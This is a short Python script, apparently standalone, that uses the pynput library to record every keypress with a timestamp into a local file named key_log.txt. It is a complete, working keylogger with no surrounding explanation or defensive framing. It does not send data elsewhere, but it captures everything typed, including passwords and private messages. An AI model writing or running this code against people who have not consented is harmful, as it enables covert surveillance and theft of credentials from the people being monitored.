import logging
from pynput.keyboard import Key, Listener

# Setting up the logging configuration
log_dir = ""
logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

def on_press(key):
    logging.info(str(key))

# Setting up the listener
with Listener(on_press=on_press) as listener:
    listener.join()
